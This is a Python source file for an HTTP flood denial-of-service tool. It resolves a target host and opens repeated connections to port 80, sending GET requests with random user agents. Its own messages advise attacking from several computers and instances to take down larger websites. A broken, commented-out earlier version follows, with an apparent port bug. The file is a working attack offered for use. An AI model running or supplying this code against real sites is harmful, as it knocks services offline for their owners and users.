import socket
from random import choice
from useragnet import user_agents
from src import clear_src


def dos(host):
    clear_src()

    print("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print("[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print("[*]IP of the host: "+ip+"\n\n")
    conn = input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        print("[*]FLOODING!")
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
        s.send("User-Agent: ".encode() +
               choice(user_agents).encode()+"\r\n\r\n".encode())
        s.close()






















#import socket
#from datetime import datetime 
#import random
#from src import clear_src
#from useragent import user_agents

#def dos(host):
 #       clear_src()
  #      print("************START***********")
   #     print("starting hostinh "+host)
    #    ip=socket.gethostbyname(host)
	#print("starting IP"+ip)
	#conn=int(input("Enter number of ports"))

        #for i in range(conn):
         #       try:
          #              s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	#	except:
         #               print("[!] UNABLE TO CONNECT")

          #      try:
           #             s.connect((ip,conn))

            #    except:
             #           print("Unable to connect...")
              #          continue


               # print("[*]FLOODING!")
                #s.send("GET / HTTP/1.1\r\n".encode())
                #time.sleep(5)
                #s.send("Host: ".encode()+host.encode()+"\r\n".encode())
                #time.sleep(5)
                #s.send("User-Agent: ".encode() +choice(user_agents).encode()+"\r\n\r\n".encode())
                #time.sleep(5)
                #s.close()



		




